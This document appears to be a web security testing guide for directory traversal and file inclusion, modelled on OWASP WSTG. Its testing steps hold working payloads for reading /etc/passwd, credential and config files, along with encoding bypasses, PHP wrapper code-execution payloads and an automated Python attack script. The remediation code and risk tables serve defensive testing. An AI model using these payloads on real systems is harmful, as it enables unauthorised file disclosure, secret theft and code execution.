# WSTG-AUTHZ-01: Testing Directory Traversal File Include

## Test ID
WSTG-AUTHZ-01

## Test Name
Testing Directory Traversal File Include

## High-Level Description

Directory traversal (also known as path traversal) is a vulnerability that allows attackers to access files and directories outside the intended directory by manipulating file path parameters. Attackers use special characters like `../` to navigate the file system and access sensitive files such as configuration files, password files, or application source code.

---

## What to Check

### Vulnerable Parameters

- [ ] File download parameters
- [ ] Image/document path parameters
- [ ] Template file parameters
- [ ] Language/locale file parameters
- [ ] Log file viewers
- [ ] Configuration file loaders
- [ ] Include file parameters

### Common Targets

| Target File | Purpose |
|-------------|---------|
| `/etc/passwd` | Linux user accounts |
| `/etc/shadow` | Linux password hashes |
| `C:\Windows\win.ini` | Windows system file |
| `C:\Windows\System32\config\SAM` | Windows credentials |
| `/var/log/apache2/access.log` | Web server logs |
| `WEB-INF/web.xml` | Java app config |
| `.env` | Environment variables |

---

## How to Test

### Step 1: Identify File Parameters

```bash
# Look for file-related parameters
# Common parameter names:
# file, path, doc, document, folder, root, pg, style, pdf, template,
# php_path, lang, page, name, cat, dir, action, board, date, detail,
# download, prefix, include, inc, locate, show, site, type, view, content

# Find parameters in requests
grep -rE "file=|path=|doc=|template=|page=|include=" burp_requests.txt
```

### Step 2: Basic Traversal Tests

```bash
# Linux targets
curl -s "https://target.com/download?file=../../../etc/passwd"
curl -s "https://target.com/download?file=....//....//....//etc/passwd"
curl -s "https://target.com/download?file=..%2f..%2f..%2fetc/passwd"
curl -s "https://target.com/download?file=..%252f..%252f..%252fetc/passwd"

# Windows targets
curl -s "https://target.com/download?file=..\..\..\..\windows\win.ini"
curl -s "https://target.com/download?file=..%5c..%5c..%5cwindows\win.ini"
```

### Step 3: Encoding Bypass Techniques

```bash
#!/bin/bash
# Test various encoding bypasses

target="https://target.com/download?file="
payloads=(
    # Basic traversal
    "../../../etc/passwd"
    "..\\..\\..\\etc\\passwd"

    # URL encoding
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"

    # Double URL encoding
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"

    # Unicode encoding
    "..%c0%af..%c0%af..%c0%afetc/passwd"
    "..%c1%9c..%c1%9c..%c1%9cetc/passwd"

    # Null byte injection (older systems)
    "../../../etc/passwd%00.jpg"
    "../../../etc/passwd%00.pdf"

    # Double dots with various separators
    "....//....//....//etc/passwd"
    "..../..../..../etc/passwd"
    "....\/....\/....\/etc/passwd"

    # Absolute path
    "/etc/passwd"
    "file:///etc/passwd"
)

for payload in "${payloads[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload', safe=''))")
    response=$(curl -s "${target}${payload}" | head -c 200)

    if echo "$response" | grep -q "root:"; then
        echo "[VULN] Payload works: $payload"
    fi
done
```

### Step 4: Wrapper/Protocol Tests

```bash
# PHP wrappers (if PHP is used)
curl -s "https://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"
curl -s "https://target.com/page?file=php://input" -d "<?php system('id'); ?>"
curl -s "https://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
curl -s "https://target.com/page?file=expect://id"

# File protocol
curl -s "https://target.com/page?file=file:///etc/passwd"

# Zip wrapper
curl -s "https://target.com/page?file=zip://uploads/malicious.zip%23shell.php"
```

### Step 5: Web Application Specific Paths

```bash
# Java/Tomcat
curl -s "https://target.com/download?file=../WEB-INF/web.xml"
curl -s "https://target.com/download?file=../WEB-INF/classes/config.properties"
curl -s "https://target.com/download?file=../META-INF/MANIFEST.MF"

# ASP.NET
curl -s "https://target.com/download?file=../web.config"
curl -s "https://target.com/download?file=../bin/App_Code.dll"

# Node.js
curl -s "https://target.com/download?file=../package.json"
curl -s "https://target.com/download?file=../.env"
curl -s "https://target.com/download?file=../config/database.js"

# Python/Django/Flask
curl -s "https://target.com/download?file=../settings.py"
curl -s "https://target.com/download?file=../requirements.txt"
```

### Step 6: Automated Testing

```python
#!/usr/bin/env python3
import requests
import urllib.parse
import sys

class PathTraversalTester:
    def __init__(self, base_url, param_name):
        self.base_url = base_url
        self.param_name = param_name
        self.session = requests.Session()

    # Common traversal payloads
    PAYLOADS = [
        # Basic
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",

        # URL encoded
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "..%2f..%2f..%2fetc/passwd",

        # Double encoded
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",

        # Unicode/overlong
        "..%c0%af..%c0%af..%c0%afetc/passwd",

        # Null byte
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.txt",

        # Filter bypass
        "....//....//....//etc/passwd",
        "..../....//..../etc/passwd",
        "....\/....\/....\/etc/passwd",

        # Absolute paths
        "/etc/passwd",
        "//etc/passwd",

        # Windows
        "..\\..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5c..%5cwindows\\win.ini",
        "....\\\\....\\\\....\\\\windows\\win.ini",
    ]

    # Indicators of successful traversal
    INDICATORS = {
        "linux": ["root:", "daemon:", "bin:", "sys:"],
        "windows": ["[fonts]", "[extensions]", "[Mail]"],
        "config": ["password", "secret", "api_key", "database"],
    }

    def test_traversal(self):
        """Test all payloads"""
        print(f"[*] Testing {self.base_url} with parameter '{self.param_name}'")
        vulnerabilities = []

        for payload in self.PAYLOADS:
            try:
                url = f"{self.base_url}?{self.param_name}={payload}"
                response = self.session.get(url, timeout=10)

                # Check for success indicators
                for os_type, indicators in self.INDICATORS.items():
                    for indicator in indicators:
                        if indicator in response.text:
                            print(f"[VULN] {os_type.upper()} file accessed with: {payload}")
                            vulnerabilities.append({
                                "payload": payload,
                                "type": os_type,
                                "indicator": indicator
                            })
                            break

            except Exception as e:
                print(f"[ERROR] {payload}: {e}")

        return vulnerabilities

    def test_depth(self, max_depth=15):
        """Test different traversal depths"""
        print(f"[*] Testing traversal depths up to {max_depth}")

        for depth in range(1, max_depth + 1):
            traversal = "../" * depth
            payload = f"{traversal}etc/passwd"

            try:
                url = f"{self.base_url}?{self.param_name}={payload}"
                response = self.session.get(url, timeout=10)

                if "root:" in response.text:
                    print(f"[VULN] Success at depth {depth}: {payload}")
                    return depth

            except:
                pass

        print("[INFO] No successful traversal at tested depths")
        return None

# Usage
if __name__ == "__main__":
    tester = PathTraversalTester(
        "https://target.com/download",
        "file"
    )

    vulns = tester.test_traversal()
    depth = tester.test_depth()

    if vulns:
        print(f"\n[!] Found {len(vulns)} vulnerabilities")
```

---

## Tools

### Automated Scanners

| Tool | Description | Usage |
|------|-------------|-------|
| **Burp Suite** | Intruder with traversal payloads | Automated testing |
| **dotdotpwn** | Directory traversal fuzzer | `dotdotpwn -m http -h target.com` |
| **dirsearch** | Web path scanner | Path discovery |
| **wfuzz** | Web fuzzer | `wfuzz -c -w traversal.txt -u "URL?file=FUZZ"` |

### Wordlists

| Wordlist | Source |
|----------|--------|
| `traversal.txt` | SecLists |
| `LFI-gracefulsecurity-linux.txt` | SecLists |
| `LFI-gracefulsecurity-windows.txt` | SecLists |

---

## Remediation Guide

### 1. Input Validation

```python
import os
import re

def secure_file_access(user_input, base_directory):
    """Secure file access with path validation"""

    # Whitelist allowed characters
    if not re.match(r'^[a-zA-Z0-9_\-\.]+$', user_input):
        raise ValueError("Invalid filename")

    # Construct full path
    full_path = os.path.join(base_directory, user_input)

    # Resolve to absolute path and check it's within base
    real_path = os.path.realpath(full_path)
    real_base = os.path.realpath(base_directory)

    if not real_path.startswith(real_base + os.sep):
        raise ValueError("Path traversal detected")

    # Check file exists
    if not os.path.isfile(real_path):
        raise FileNotFoundError("File not found")

    return real_path
```

### 2. Java Implementation

```java
import java.io.File;
import java.nio.file.Path;
import java.nio.file.Paths;

public class SecureFileHandler {
    private final Path baseDirectory;

    public SecureFileHandler(String basePath) {
        this.baseDirectory = Paths.get(basePath).toAbsolutePath().normalize();
    }

    public File getSecureFile(String userInput) throws SecurityException {
        // Validate input - only allow alphanumeric and specific chars
        if (!userInput.matches("[a-zA-Z0-9_\\-\\.]+")) {
            throw new SecurityException("Invalid filename");
        }

        // Resolve path
        Path requestedPath = baseDirectory.resolve(userInput).normalize();

        // Verify within base directory
        if (!requestedPath.startsWith(baseDirectory)) {
            throw new SecurityException("Path traversal attempt detected");
        }

        File file = requestedPath.toFile();

        if (!file.exists() || !file.isFile()) {
            throw new SecurityException("File not found");
        }

        return file;
    }
}
```

### 3. Node.js Implementation

```javascript
const path = require('path');
const fs = require('fs');

function secureFileAccess(userInput, baseDirectory) {
    // Whitelist validation
    if (!/^[a-zA-Z0-9_\-\.]+$/.test(userInput)) {
        throw new Error('Invalid filename');
    }

    // Resolve paths
    const basePath = path.resolve(baseDirectory);
    const requestedPath = path.resolve(baseDirectory, userInput);

    // Check path is within base directory
    if (!requestedPath.startsWith(basePath + path.sep)) {
        throw new Error('Path traversal detected');
    }

    // Verify file exists
    if (!fs.existsSync(requestedPath) || !fs.statSync(requestedPath).isFile()) {
        throw new Error('File not found');
    }

    return requestedPath;
}
```

### 4. Use ID-Based File References

```python
# Instead of passing filenames, use IDs
# Database: files (id, filename, user_id)

@app.route('/download/<int:file_id>')
def download_file(file_id):
    # Query database for file info
    file_record = File.query.filter_by(
        id=file_id,
        user_id=current_user.id
    ).first_or_404()

    # Construct path from stored filename
    file_path = os.path.join(UPLOAD_DIR, file_record.stored_name)

    return send_file(file_path, as_attachment=True,
                     download_name=file_record.original_name)
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Read arbitrary system files | 7.5 | High |
| Read application config/secrets | 8.6 | High |
| Access to source code | 6.5 | Medium |
| Limited file disclosure | 5.3 | Medium |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-22** | Improper Limitation of a Pathname to a Restricted Directory | Path traversal |
| **CWE-23** | Relative Path Traversal | Using ../ to escape |
| **CWE-36** | Absolute Path Traversal | Using absolute paths |
| **CWE-73** | External Control of File Name or Path | User controls path |

---

## References

- [OWASP WSTG - Testing Directory Traversal](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [PortSwigger Path Traversal](https://portswigger.net/web-security/file-path-traversal)

---

## Checklist

```
[ ] File-related parameters identified
[ ] Basic traversal sequences tested
[ ] URL encoding bypasses tested
[ ] Double encoding tested
[ ] Unicode encoding tested
[ ] Null byte injection tested
[ ] Filter bypass techniques tested
[ ] PHP wrappers tested (if applicable)
[ ] Application-specific paths tested
[ ] Windows and Linux paths tested
[ ] Different traversal depths tested
[ ] Findings documented
[ ] Remediation recommendations provided
```
